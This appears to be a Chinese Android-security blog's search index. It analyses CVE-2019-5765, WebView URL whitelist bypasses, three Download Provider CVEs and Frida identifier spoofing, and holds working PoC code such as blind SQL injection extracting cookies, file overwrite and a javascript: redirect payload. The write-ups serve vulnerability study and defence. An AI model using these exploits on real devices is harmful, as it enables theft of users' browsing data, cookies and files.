<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[CVE-2019-5765分析]]></title>
    <url>%2F2019%2F05%2F21%2FCVE-2019-5765%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[简述CVE-2019-5765的原理比较简单。Chrome Android客户端注册了一个broadcast receiver, 当接收到(app_package)_GPU_PROFILER_START广播后，会开启trace, 并将所有的url请求和header(不包含cookie)保存在文件中。 然而，这个receiver未做好权限控制，导致任意第三方应用都可以发送该广播开启chrome的trace,而且还可以指定trace log的保存路径，恶意应用通过读取trace log文件可以窃取用户所有的浏览记录。 影响范围该漏洞影响所有chrome内核版本小于72.0.3626.81的浏览器，例如webview、第三方浏览器等等。 通常，该漏洞的利用需要攻击者在用户手机上安装一个恶意apk，通过发送广播可以获取目标浏览器或webview上所有的浏览记录，以及用户的登录凭据（例如Oauth token, header里的敏感token）等。 PoC 发送广播开启trace 1adb shell am broadcast -a com.android.chrome.GPU_PROFILER_START 在目标浏览器中打开一个页面 发送广播关闭trace1adb shell am broadcast -a com.android.chrome.GPU_PROFILER_STOP trace log默认保存在/sdcard/Download/目录下，例如”/sdcard/Download/chrome-profile-results-2019-05-24-084507“，使用adb shell am broadcast -a com.android.chrome.GPU_PROFILER_START -e file mypath可以指定保存路径。 漏洞修复修复方式为”只有debug版本的系统才会注册该receiver“ 总结 Android 7.0之后，系统webview使用Chrome的引擎，因此更新Chrome即可修复漏洞。在安装Play Store的系统上，Chrome和系统内置webview会自动更新到最新版本。Android 7.0之前的系统需要更新系统内置的webview 未安装Play Store的AOSP系统（三星、华为、小米、oppo、vivo等）需要厂商来更新，因此多数第三方ROM手机或定制webview浏览器厂商受该漏洞影响。 部分定制化的浏览器对chrome内核进行了修改，因此也有可能不存在这个漏洞 参考资料： chrome issue https://bugs.chromium.org/p/chromium/issues/detail?id=922627 chrome fix log https://chromium.googlesource.com/chromium/src.git/+/318a79045ace18d73e1115d086599e036d0496ba%5E%21/#F0 https://hackerone.com/reports/563870]]></content>
  </entry>
  <entry>
    <title><![CDATA[Android WebView URL检查绕过]]></title>
    <url>%2F2019%2F04%2F23%2FAndroid-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[URL结构scheme://login:password@address:port/path/to/resource/?query_string#fragment scheme不区分大小写，包括http、https、file、ftp等等,:之后的“//”可省略，例如http:www.qq.com, 此外，多数浏览器在scheme之前加空格也是可以正常解析的 login:password@（认证信息）服务器有时候需要用户名和密码认证，ftp协议比较常见，http很少见，但这个不常见字段往往可以绕过很多检查 addressaddress字段可以是一个不区分大小写的域名、一个ipv4地址或带方括号的ipv6地址，部分浏览器接收ip地址的八进制、十进制、十六进制等写法 port端口号 /path/to/resource层级路径，可以使用“../”到上一级目录 query_string查询字符串，格式为”query_string?name1=value1&amp;name2=value2” fragment用于html中的页面定位 白名单绕过白名单绕过主要参考rebeyond的文章 一文彻底搞懂安卓WebView白名单校验, 中间添加了一些自己的绕过方法。 1.contains12345678910private static boolean checkDomain(String inputUrl)&#123; String[] whiteList=new String[]&#123;&quot;huawei.com&quot;,&quot;hicloud.com&quot;&#125;; for (String whiteDomain:whiteList) &#123; if (inputUrl.contains(whiteDomain)&gt;0) return true; &#125; return false;&#125; 绕过方式：任何可以添加字符串的字段 子域名 huawei.com.mysite.com 子路径 mysite.com/huawei.com 参数 mysite.com/xxxx#huawei.com 2.indexOf12345678910private static boolean checkDomain(String inputUrl)&#123; String[] whiteList=new String[]&#123;&quot;huawei.com&quot;,&quot;hicloud.com&quot;&#125;; for (String whiteDomain:whiteList) &#123; if (inputUrl.indexOf(whiteDomain)&gt;0) return true; &#125; return false;&#125; 绕过方式：和contains相同 3.startsWith、endsWith一般白名单会有子域名，因此不用equal 绕过方式： startsWith huawei.com.mysite.com endsWith mysitehuawei.com 4.://和第一个/之间提取host123456789101112private static boolean checkDomain(String inputUrl)&#123; String[] whiteList=new String[]&#123;&quot;huawei.com&quot;,&quot;hicloud.com&quot;&#125;; String tempStr=inputUrl.replace(&quot;://&quot;,&quot;&quot;); String inputDomain=tempStr.substring(0,tempStr.indexOf(&quot;/&quot;)); //提取host for (String whiteDomain:whiteList) &#123; if (inputDomain.indexOf(whiteDomain)&gt;0) return true; &#125; return false;&#125; 绕过方式： 子域名 huawei.com.mysite.com http://huawei.com@www.rebeyond.net/poc.htm http://a:a@www.huawei.com:b@www.baidu.com 在android中使用getHost获取到的是huawei.com,但实际访问的是baidu.com 5.使用java.net.URL提取host1234567891011private static boolean checkDomain(String inputUrl) throws MalformedURLException &#123; String[] whiteList=new String[]&#123;&quot;huawei.com&quot;,&quot;hicloud.com&quot;&#125;; java.net.URL url=new java.net.URL(inputUrl); String host=url.getHost(); //提取host for (String whiteDomain:whiteList) &#123; if (host.equals(whiteDomain)) return true; &#125; return false;&#125; 绕过方式： http://a:a@www.huawei.com:b@www.baidu.com 在android中使用getHost获取到的是huawei.com,但实际访问的是baidu.com https://www.mysite.com\@www.huawei.com/poc.htm上述URL通过java.net.URL的getHost方法得到的host是www.huawei.com，但实际上访问的确是www.mysite.com https://www.mysite.com\\.huawei.com经过java.net.URL的getHost方法提取得到的是www.mysite.com.huawei.com，可以绕过白名单域名的endsWith匹配，但是实际访问的确是www.mysite.com服务器(新版已修复) 6.java.net.URIjava.net.URI能获取到正常的host,但是可以利用JavaScript协议绕过1234567891011rivate static boolean checkDomain(String inputUrl) throws URISyntaxException &#123; String[] whiteList=new String[]&#123;&quot;huawei.com&quot;,&quot;hicloud.com&quot;&#125;; java.net.URI url=new java.net.URI(inputUrl); String inputDomain=url.getHost(); //提取host for (String whiteDomain:whiteList) &#123; if (inputDomain.endsWith(&quot;.&quot;+whiteDomain)) //www.huawei.com app.hicloud.com return true; &#125; return false;&#125; 绕过方式：1javascript://www.huawei.com/%0d%0awindow.location.href=‘http://www.rebeyond.net/poc.htm‘ 相当于执行了一行js代码，第一行通过//符号来骗过java.net.URI获取到值为www.huawei.com的host，恰好//符号在Javascript的世界里是行注释符号，所以第一行实际并没有执行；然后通过%0d%0a换行，继续执行window.location.href=’http://www.rebeyond.net/poc.htm’ 7.排除javascript协议123456789101112131415private static boolean checkDomain(String inputUrl) throws URISyntaxException &#123; if (!inputUrl.startsWith(&quot;http://&quot;)&amp;&amp;!inputUrl.startsWith(&quot;https://&quot;)) &#123; return false; &#125; String[] whiteList=new String[]&#123;&quot;huawei.com&quot;,&quot;hicloud.com&quot;&#125;; java.net.URI url=new java.net.URI(inputUrl); String inputDomain=url.getHost(); //提取host for (String whiteDomain:whiteList) &#123; if (inputDomain.endsWith(&quot;.&quot;+whiteDomain)) //www.huawei.com app.hicloud.com return true; &#125; return false;&#125; 绕过方式：配合url重定向漏洞，例如https://www.huawei.com/redirect.php?url=http://mysite.com 防御办法：Webview在请求https://www.huawei.com/redirect.php?url=http://mysite.com的时候，实际是发出了两次请求，第一次是在loadUrl中请求，第二次是请求http://mysite.com，但是第二次请求发生在loadUrl之后，而我们的白名单校验逻辑在loadUrl之前，才导致了绕过。通过在webview的shouldOverrideUrlLoading方法中检测，拦截跳转。 黑名单有些app会在URL中指定黑名单，例如竞品域名等，这里简单罗列一些思路： 使用大小写绕过contains，例如HTTP://MySITe.com 使用特殊编码 待补充 file协议绕过APP经常会使用file://协议加载本地文件，通常会限制在一些特定路径中，这里记录一下之前的经验： 不要用url.startWith(”file://”)来判断是否为file协议，因为“FILE://”(大小)、“File://”(大小写)、“ file://”(前边加空格)、“file:”等方式都可以绕过检测。url.contains(“file://”)更不靠谱，推荐使用getScheme()来判断协议； file:///android_asset和file:///android_res 也可以../穿越 白名单判断了“../，但通过“..\”也是可以穿越的，例如file:///sdcard/..\../sdcard/1.html getHost有漏洞（file://a:a@www.qq.com:b@www.baidu.com使用getHost获取到的是qq.com,但实际访问的是baidu.com) file://baidu.com/data/data/tmp 前边的baidu.com是可以不被解析的协议头不包括///，还是仍然能够正常loadUrl，如file:mnt/sdcard/filedomain.html 白名单判断了“../”，但通过url编码绕过，例如file:///data/data/com.app/%2e%2e/%2e%2e/%2e%2e/sdcard/xxx replace(“../“,””)可以使用”….//“绕过 参考资料： 一文彻底搞懂安卓WebView白名单校验 https://android.googlesource.com/platform/frameworks/base/+/4afa0352d6c1046f9e9b67fbf0011bcd751fcbb5 https://android.googlesource.com/platform/frameworks/base/+/0b57631939f5824afef06517df723d2e766e0159]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Download Provider 3个漏洞分析]]></title>
    <url>%2F2019%2F04%2F15%2FAndroid-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[IOActive的安全研究员Daniel Kachakil发现了Android Download Provider相关的几个漏洞（CVE-2018-9468, CVE-2018-9493, CVE-2018-9546）,漏洞原理看似简单却十分有趣，这里总结一下。 原文链接：https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/ Download Provider首先了解下Download Provider。Android系统的ContentProvider类似于应用数据库，用于共享自己的数据被其他的应用程序访问。Android提供了一套处理其他App下载请求的机制，例如浏览器的下载、邮件附件的下载、OTA升级包下载等。其中Download Manager用来处理下载请求，DownloadManager下载过程中，会将下载的数据和下载的状态插入ContentProvider中，完成下载后使用ContentProvider来提供下载内容给请求方APP。 使用DownloadManager下载文件的示例代码如下：12345678910//创建下载请求 DownloadManager.Request req = new DownloadManager.Request(Uri.parse(&quot;http://www.qq.com&quot;));//设置下载路径 File saveFile = new File(Environment.getExternalStorageDirectory(), &quot;demo.apk&quot;); req.setDestinationUri(Uri.fromFile(saveFile)); DownloadManager manager = (DownloadManager) getApplicationContext().getSystemService(Context.DOWNLOAD_SERVICE);// 将下载请求加入下载队列, 返回一个下载ID long downloadId = manager.enqueue(req); 关于Download Provider我们需要了解以下几点： 下载完成后，APP访问下载进度、下载状态、下载文件数据等都需要通过download_id来访问，Download Provider提供了三种方式 参考： content://downloads/public_downloads/(download_id) 公开下载的文件，不需要任何权限 content://downloads/all_downloads/(download_id) 访问所有的下载文件，需要ACCESS_ALL_DOWNLOADS权限（Signature级别的权限） content://downloads/my_downloads/(download_id) 访问应用自己下载的文件 Download Provider由系统应用com.android.providers.downloads实现，因此作为一个应用，下载保存的位置只可能为public sdcard、private sdcard以及/data/data/com.android.providers.downloads 目录内，如不指定路径，默认下载位置为/data/data/com.android.providers.downloads/cache/ Download Provider实现了一套访问控制机制，应用只能访问自己下载的文件，无权限访问其他应用下载的文件，因此遍历download_id是不可行的。（当然保存在sdcard的文件除外，因为只要有sdcard权限就可以读文件了） 我们知道ContentProvider如果配置不当，可能导致信息泄露、目录穿越等问题，同样如果Download Provider的实现中配置不当有可能带来一些安全问题，下面依次展开这三个漏洞。 CVE-2018-9468: Download Provider权限绕过正常情况下，APP只能访问自己下载的文件，然而由于content://downloads/public_downloads/(download_id)未做好权限控制，导致可以通过遍历download_id访问所有其他app的下载文件，包括文件下载时的title, description, size, full URL等等。 漏洞修复前后的对比https://android.googlesource.com/platform/packages/providers/DownloadProvider/+/544294737dfc3b585465302f1f784a311659a37c%5E%21/#F0 从补丁来看，Android是删掉了public_downloads这个ContentProvider PoC代码如下：12345678910111213//1493 其他app下载的 //1492 自己app下载的 ContentResolver res = getContentResolver(); Uri uri = Uri.parse(&quot;content://downloads/my_downloads/1493&quot;); Cursor cur = res.query(uri,null,null,null,null,null); cur.moveToFirst(); String rowdata = cur.getString(cur.getColumnIndex(&quot;_data&quot;)); String rowUri = cur.getString(cur.getColumnIndex(&quot;uri&quot;)); String rowTitle = cur.getString(cur.getColumnIndex(&quot;title&quot;)); String rowdescription = cur.getString(cur.getColumnIndex(&quot;description&quot;)); Log.d(&quot;m4bln&quot;,rowTitle); Log.d(&quot;m4bln&quot;,rowUri); Log.d(&quot;m4bln&quot;,rowdescription); 除了读取其他app下载的文件外，还可以利用openFile()进行修改。Content Provider的openFile是通过query()对文件定位的,因此该漏洞也会影响openFile()。 通过openFile（）我们甚至可以写文件:12345678910111213141516171819202122232425262728293031323334353637ContentResolver res = getContentResolver();Uri uri = Uri.parse(&quot;content://downloads/my_downloads/1493&quot;);Cursor cur = res.query(uri, null, null, null, null);try &#123; if (cur != null &amp;&amp; cur.getCount() &gt; 0) &#123; cur.moveToFirst(); String rowData = cur.getString(cur.getColumnIndex(&quot;_data&quot;)); if (rowData != null &amp;&amp; !rowData.isEmpty()) &#123; try &#123; ParcelFileDescriptor fd = res.openFileDescriptor(uri, &quot;rwt&quot;); FileWriter fw = new FileWriter(fd.getFileDescriptor()); DateFormat dateFormat = new SimpleDateFormat(&quot;yyyy/MM/dd HH:mm:ss&quot;); fw.write(dateFormat.format(new Date())); fw.write(&quot;\n(Any arbitrary contents can be placed here...)&quot;); log(LOG_SEPARATOR + &quot;Overwritten file: &quot; + rowData); fw.flush(); // Closing the file descriptor will crash the Android Media process if (closeFile) fd.close(); else mFileDescriptors.add(fd); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; else log(LOG_SEPARATOR + &quot;Cannot overwrite file. The path is empty.&quot;); &#125; else log(LOG_SEPARATOR + &quot;Cannot overwrite file. The download ID &quot; + id + &quot; does not exist.&quot;);&#125; finally &#123; if (cur != null) cur.close();&#125; 这样，利用CVE-2018-9468就可以在下载完成的瞬间替换成攻击者的文件，进行中间人攻击了。作者利用这个漏洞完成了对GooglePlay进行Dos攻击、对gmail的附件进行hijack等攻击。 CVE-2018-9493: Download Provider SQL注入Download Provider中的以下columns是不允许被外部访问的，例如CookieData，但是利用SQL注入漏洞可以绕过这个限制。 projection参数存在注入漏洞，结合二分法可以爆出某些columns字段的内容。 漏洞修复前后的diff如下： 漏洞利用代码如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697private void dump(boolean dumpProtectedColumns) &#123; ContentResolver res = getContentResolver(); Uri uri = Uri.parse(MY_DOWNLOADS_URI); Cursor cur; try &#123; cur = res.query(uri, null, &quot;1=1) or (1=1&quot;, null, null); &#125; catch (IllegalArgumentException e) &#123; Log.e(TAG, &quot;Error&quot;, e); log(&quot;ERROR: The device does not appear to be vulnerable&quot;); return; &#125; try &#123; if (cur != null &amp;&amp; cur.getCount() &gt; 0) &#123; // Iterate all results and display some fields for each row from the downloads database while (cur.moveToNext()) &#123; int rowId = cur.getInt(cur.getColumnIndex(&quot;_id&quot;)); String rowData = cur.getString(cur.getColumnIndex(&quot;_data&quot;)); String rowUri = cur.getString(cur.getColumnIndex(&quot;uri&quot;)); String rowTitle = cur.getString(cur.getColumnIndex(&quot;title&quot;)); String rowDescription = cur.getString(cur.getColumnIndex(&quot;description&quot;)); StringBuilder sb = new StringBuilder(LOG_SEPARATOR); sb.append(&quot;DOWNLOAD ID &quot;).append(rowId); sb.append(&quot;\nData: &quot;).append(rowData); sb.append(&quot;\nUri: &quot;).append(rowUri); sb.append(&quot;\nTitle: &quot;).append(rowTitle); sb.append(&quot;\nDescription: &quot;).append(rowDescription); if (dumpProtectedColumns) &#123; int uid = binarySearch(rowId, &quot;uid&quot;); sb.append(&quot;\nUID: &quot;).append(uid); dumpColumn(rowId, &quot;CookieData&quot;, sb); dumpColumn(rowId, &quot;ETag&quot;, sb); &#125; log(sb.toString()); &#125; log(&quot;\n\nDUMP FINISHED&quot;); &#125; &#125; finally &#123; if (cur != null) cur.close(); &#125; &#125; private void dumpColumn(int rowId, String columnName, StringBuilder sb) &#123; if (isTrueCondition(rowId, &quot;length(&quot; + columnName + &quot;) &gt; 0&quot;)) &#123; int len = binarySearch(rowId, &quot;length(&quot; + columnName + &quot;)&quot;); sb.append(&quot;\n&quot; + columnName + &quot;: &quot;); for (int i = 1; i &lt;= len; i++) &#123; int c = binarySearch(rowId, &quot;unicode(substr(&quot; + columnName + &quot;,&quot; + i + &quot;,1))&quot;); String newChar = Character.toString((char) c); sb.append(newChar); &#125; &#125; &#125; private int binarySearch(int id, String sqlExpression) &#123; int min = 0; int max = 20000; int mid = 0; while (min + 1 &lt; max) &#123; mid = (int) Math.floor((double) (max + min) / 2); if (isTrueCondition(id, sqlExpression + &quot;&gt;&quot; + mid)) min = mid; else max = mid; &#125; if ((mid == max) &amp;&amp; isTrueCondition(id, sqlExpression + &quot;=&quot; + mid)) return mid; else if (isTrueCondition(id, sqlExpression + &quot;=&quot; + (mid + 1))) // Extra check return mid + 1; return -1; &#125; private boolean isTrueCondition(int rowId, String sqlCondition) &#123; ContentResolver res = getContentResolver(); Uri uri = Uri.parse(MY_DOWNLOADS_URI); Cursor cur = res.query(uri, new String[]&#123;&quot;_id&quot;&#125;, &quot;_id=&quot; + rowId + &quot;) and (&quot; + sqlCondition + &quot;) or (1=1&quot;, null, null); try &#123; return (cur != null &amp;&amp; cur.getCount() &gt; 0); &#125; finally &#123; if (cur != null) cur.close(); &#125; &#125; CVE-2018-9546: Download Provider文件头信息泄露Download Provider运行app获取下载的http请求头，但理论上APP只能访问自己下载的文件的http请求头，但Download Provider没有做好权限配置，导致heads可以被任意读取。header中会保存一些敏感数据，例如cookie等。 读取header的URI为：content://download/mydownloads/download_id/headers PoC代码：123456789101112131415161718Uri uri = Uri.parse(&quot;content://download/mydownloads/1493/headers&quot;);Cursor cur = res.query(uri, null, null, null, null);try &#123; if (cur != null &amp;&amp; cur.getCount() &gt; 0) &#123; StringBuilder sb = new StringBuilder(LOG_SEPARATOR); sb.append(&quot;HEADERS FOR DOWNLOAD ID &quot;).append(id).append(&quot;\n&quot;); while (cur.moveToNext()) &#123; String rowHeader = cur.getString(cur.getColumnIndex(&quot;header&quot;)); String rowValue = cur.getString(cur.getColumnIndex(&quot;value&quot;)); sb.append(rowHeader).append(&quot;: &quot;).append(rowValue).append(&quot;\n\n&quot;); &#125; log(sb.toString()); &#125;&#125; finally &#123; if (cur != null) cur.close();&#125;]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用Frida修改Android设备的唯一标识符]]></title>
    <url>%2F2018%2F12%2F20%2F%E5%88%A9%E7%94%A8Frida%E4%BF%AE%E6%94%B9Android%E8%AE%BE%E5%A4%87%E7%9A%84%E5%94%AF%E4%B8%80%E6%A0%87%E5%BF%97%E7%AC%A6%2F</url>
    <content type="text"><![CDATA[Android设备的唯一标识符1.IMEI （手机的身份证号码）IMEI(International Mobile Equipment Identity)是国际移动设备身份码的缩写，国际移动装备辨识码，是由15位数字组成的”电子串号”，它与每台移动电话机一一对应，而且该码是全世界唯一的。每一只移动电话机在组装完成后都将被赋予一个全球唯一的一组号码，这个号码从生产到交付使用都将被制造生产的厂商所记录。 有些设备的IMEI有两个，可以在拨号键盘输入“*#06#”查看。普通APP获取需要申请权限()：1234//权限 &lt;uses-permissionandroid:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);//获取IMEI号String imei = telephonyManager.getDeviceId(); 2.IMSI （SIM卡的身份证号码）IMSI是区别移动用户的标志，储存在SIM卡中，可用于区别移动用户的有效信息。其总长度不超过15位，同样使用0～9的数字，例如460010280100023。其中MCC是移动用户所属国家代号，占3位数字，中国的MCC规定为460；MNC是移动网号码，最多由两位数字组成，用于识别移动用户所归属的移动通信网；MSIN是移动用户识别码，用以识别某一移动通信网中的移动用户， IMSI与IMEI权限相同，获取代码：1234//权限 &lt;uses-permissionandroid:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);//获取IMSI号String imsi=telephonyManager.getSubscriberId(); 3.ANDROID_IDANDROID_ID 是一串64位的数字，并以16进制字符串的形式保存下来，是设备首次启动时随机生成的设备的第一个引导，其记录着一个固定值，通过它可以知道设备的寿命。ANDROID_ID也可视为作为唯一设备标识号的一个好选择，当设备没有手机号时，例如平板设备等，可以采用ANDROID_ID作为标识。需要注意： android_id在设备恢复出厂设置后，该值会改变 部分定制手机获取到的android_id为null 由于定制问题，不同的设备可能会产生相同的ANDROID_ID Android 8.0后不同应用获得的值不同 应用签署密钥、用户和设备的每个组合都具有唯一的 ANDROID_ID 值。因此，在相同设备上运行但具有不同签署密钥的应用将不会再看到相同的 Android ID（即使对于同一用户来说，也是如此）参考https://developer.android.com/about/versions/oreo/android-8.0-changes?hl=zh-cn android_id获取方式：12import android.provider.Settings; String ANDROID_ID =Settings.System.getString(getContentResolver(),Settings.System.ANDROID_ID); 4.设备序列号（Serial Number 或 SN）SN码是Serial Number的缩写，有时也叫SerialNo，也就是产品序列号，产品序列是为了验证“产品的合法身份”而引入的一个概念，它是用来保障用户的正版权益，享受合法服务的；一套正版的产品只对应一组产品序列号。别称：机器码、认证码、注册申请码等。 获取方式： 1.adb shell 1adb shell getprop ro.serialno 2.android.os.Build 1String SerialNumber = android.os.Build.SERIAL; 3.android.os.SystemProperties.get此API为hidden API，需要反射获取 12345678910111213141516ClassLoader cl = context.getClassLoader();Class SystemProperties = cl.loadClass(&quot;android.os.SystemProperties&quot;);//参数类型Class[] paramTypes= new Class[2];paramTypes[0]= String.class;paramTypes[1]= String.class;Method get = SystemProperties.getMethod(&quot;get&quot;, paramTypes);//参数Object[] params= new Object[2];params[0]= new String(key);params[1]= new String(def);ret= (String) get.invoke(SystemProperties, params); 除了SN号，还有制造商、品牌、型号、设备名等其他信息和SN的获取方式相同123456789101112131415161718192021222324android.os.Build.BRAND：获取设备品牌android.os.Build.MODEL ：获取手机的型号 设备名称。android.os.Build.MANUFACTURER:获取设备制造商android.os.Build.BOARD：获取设备基板名称android.os.Build.BOOTLOADER:获取设备引导程序版本号android.os.Build.CPU_ABI：获取设备指令集名称（CPU的类型）android.os.Build.CPU_ABI2：获取第二个指令集名称android.os.Build.DEVICE：获取设备驱动名称android.os.Build.DISPLAY：获取设备显示的版本包（在系统设置中显示为版本号）和ID一样android.os.Build.FINGERPRINT：设备的唯一标识。由设备的多个信息拼接合成。android.os.Build.HARDWARE：设备硬件名称,一般和基板名称一样（BOARD）android.os.Build.HOST：设备主机地址android.os.Build.ID:设备版本号。android:os.Build.PRODUCT：整个产品的名称android:os.Build.RADIO：无线电固件版本号，通常是不可用的 显示unknownandroid.os.Build.TAGS：设备标签。如release-keys 或测试的 test-keys android.os.Build.TIME：时间android.os.Build.TYPE:设备版本类型 主要为&quot;user&quot; 或&quot;eng&quot;.android.os.Build.USER:设备用户名 基本上都为android-buildandroid.os.Build.VERSION.RELEASE：获取系统版本字符串。如4.1.2 或2.2 或2.3等android.os.Build.VERSION.CODENAME：设备当前的系统开发代号，一般使用REL代替android.os.Build.VERSION.INCREMENTAL：系统源代码控制值，一个数字或者git hash值android.os.Build.VERSION.SDK：系统的API级别 一般使用下面大的SDK_INT 来查看android.os.Build.VERSION.SDK_INT：系统的API级别 数字表示 5.MAC地址12android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) context.getSystemService(Context.WIFI_SERVICE);String macAddress = wifi.getConnectionInfo().getMacAddress(); 没有 WiFi 硬件或者 WiFi 不可用的设备可能返回 null 或空 Android 6.0开始，谷歌为保护用户数据，用此方法获取到的 Wi-Fi mac 地址都为02:00:00:00:00:00 需要 ACCESS_WIFI_STATE 权限 Frida hook代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465Java.perform(function() &#123; var TelephonyManager = Java.use(&quot;android.telephony.TelephonyManager&quot;); //IMEI hook TelephonyManager.getDeviceId.overload().implementation = function () &#123; console.log(&quot;[*]Called - getDeviceId()&quot;); var temp = this.getDeviceId(); console.log(&quot;real IMEI: &quot;+temp); return &quot;867979021642856&quot;; &#125;; // muti IMEI TelephonyManager.getDeviceId.overload(&apos;int&apos;).implementation = function (p) &#123; console.log(&quot;[*]Called - getDeviceId(int) param is&quot;+p); var temp = this.getDeviceId(p); console.log(&quot;real IMEI &quot;+p+&quot;: &quot;+temp); return &quot;867979021642856&quot;; &#125;; //IMSI hook TelephonyManager.getSimSerialNumber.overload().implementation = function () &#123; console.log(&quot;[*]Called - getSimSerialNumber(String)&quot;); var temp = this.getSimSerialNumber(); console.log(&quot;real IMSI: &quot;+temp); return &quot;123456789&quot;; &#125;; ////////////////////////////////////// //ANDOID_ID hook var Secure = Java.use(&quot;android.provider.Settings$Secure&quot;); Secure.getString.implementation = function (p1,p2) &#123; if(p2.indexOf(&quot;android_id&quot;)&lt;0) return this.getString(p1,p2); console.log(&quot;[*]Called - get android_ID, param is:&quot;+p2); var temp = this.getString(p1,p2); console.log(&quot;real Android_ID: &quot;+temp); return &quot;844de23bfcf93801&quot;; &#125; //android的hidden API，需要通过反射调用 var SP = Java.use(&quot;android.os.SystemProperties&quot;); SP.get.overload(&apos;java.lang.String&apos;).implementation = function (p1) &#123; var tmp = this.get(p1); console.log(&quot;[*]&quot;+p1+&quot; : &quot;+tmp); return tmp; &#125; SP.get.overload(&apos;java.lang.String&apos;, &apos;java.lang.String&apos;).implementation = function (p1,p2) &#123; var tmp = this.get(p1,p2) console.log(&quot;[*]&quot;+p1+&quot;,&quot;+p2+&quot; : &quot;+tmp); return tmp; &#125; // hook MAC var wifi = Java.use(&quot;android.net.wifi.WifiInfo&quot;); wifi.getMacAddress.implementation = function () &#123; var tmp = this.getMacAddress(); console.log(&quot;[*]real MAC: &quot;+tmp); return tmp; &#125; &#125;)]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[指纹识别技术分析]]></title>
    <url>%2F2018%2F12%2F12%2F%E6%8C%87%E7%BA%B9%2F</url>
    <content type="text"><![CDATA[本文大部分总结和研究各种指纹识别的原理和安全性，作为日后指纹安全的参考wiki。 现阶段，任何一种生物特征识别，都是通过传感器把生物特征投影成像为数字信号，指纹也不例外。具体来说分为指纹图像提取、预处理、特征提取、比对等步骤。 指纹识别原理根据指纹图像提取技术的不同，现阶段主要分为光学指纹、电容指纹、超声波指纹以及屏下指纹几大类。 1.光学指纹光学指纹识别的原理如下图，手指按在指纹采集器上后，内部的光源将光线打到手指上，经过手指反射后汇集到识别器上，获得指纹图像。 现在有很多门禁、打卡机等等使用光学指纹识别技术，其缺点是如果手上有油污或者汗水，识别效果就会大幅度降低。 优点 光学指纹传感器可靠，价格便宜 缺点 手指湿水后影响光的反射 手指有干皮导致识别不了 可能会有痕迹遗留 无法识别活体，指纹可复制 攻击面 利用普通的蜡就可以制作假指纹 残留的指纹直接盖上纸片 2.电容指纹电容感测的原理就是当用户将手指按在传感器上时，会测量出指纹引起的极小的电导率变化信号，然后用测量到的数据形成一副指纹的图像。手指最外层的皮肤也就是指纹，是不导电的，而指纹里面的皮下层是导电的 电容指纹识别技术相比于光学传感器体积小、集成度高。所以这种传感器广泛应用于手机、便携设备等地方。例如高级门锁、保险箱等 优点 体积小，集成度高 图像质量较高 手指上的干皮不影响识别 依靠活体导电，有效对抗伪造 缺点 手指湿脏水后由于脏水导电，导致识别不准 成本高 攻击面 利通导电溶液制作假指纹 3.超声指纹原理是利用超声波具有穿透材料的能力，且随材料的不同产生大小不同的回波。因此，利用皮肤与空气对于声波阻抗的差异，就可以区分指纹凹凸不平的图像，甚至能渗透到皮肤表面之下识别指纹独特的3D特征 优点 湿手不影响识别 缺点 成本高 识别速度慢 攻击面 较难攻击 4.屏下指纹通俗地说，屏下指纹识别，就是将指纹识别器藏在屏幕下边，透过屏幕对用户的指纹进行信息采集和匹配识别。屏下指纹的识别传感器集成在了手机屏幕中，可以大幅提高移动设备的屏占比。 屏下指纹可以结合光学识别、电容识别和超声波识别等多种方式，进一步的提高准确率和可靠性。 屏下指纹识别目前常见的方案有两种：光学指纹识别和超声波指纹识别。目前比较知名的屏下指纹识别方案商有高通、新思、汇顶和上海箩箕等，高通主要研究超声波方案；另外三家都是光学指纹识别方案，主要是考虑到成本和效率。 优点 提高屏占比 缺点 功耗较高 只能用OLED屏幕，这种屏幕有个不大不小的缺点，即圈内所说的“烧屏”——长时间在同一区域进行指纹识别操作（亮灯）可能会加快该区域屏幕的老化，就像灯泡坏了一样。 攻击面 痕迹残留攻击 指纹攻击指纹攻击主要有两个角度： 通过指纹采集的方式获取原始指纹图像，进而制造一个假体指纹 通过文件读取等获取到指纹特征文件，根据指纹特征制造一个假体指纹（难度较高） 指纹图像的获取 带有指纹的高清晰照片（例如领导人挥手示意时） 合同、按手印活动等上面的指纹图像 通过模具成型获取到的指纹（例如明星在星光大道留下的掌印，有时精度较低） 获取手机、玻璃杯、指纹模块等上面留下的指纹痕迹 指纹制作 光敏印章 导电材料 参考资料： 指纹识别传感器科普贴（一）：技术演变历程 http://www.mems.me/mems/overview_201703/4232.html 光学vs半导体，指纹智能锁哪一种更好用？https://zhuanlan.zhihu.com/p/39490067 深度剖析：手机指纹的马奇诺防线 https://paper.seebug.org/471/ 关于屏下指纹，我们做了很有趣的测试 https://zhuanlan.zhihu.com/p/43374532 一张纸秒破指纹解锁 https://mp.weixin.qq.com/s?src=11&amp;timestamp=1544715502&amp;ver=1283&amp;signature=qiu1F0Hq5ZZNjvqtWbM6EyBmpKhFXmDhiRSv78hvdyKpH5pVVl-koBJ1VH08jSrynsOE90-7742z-bD7A2LyRt1hxOFpPZZRKlVUTAQ9gsfXy3HTK-QczhKn78x41-Vf&amp;new=1]]></content>
  </entry>
  <entry>
    <title><![CDATA[智能门锁]]></title>
    <url>%2F2018%2F12%2F11%2F%E6%99%BA%E8%83%BD%E9%97%A8%E9%94%81%2F</url>
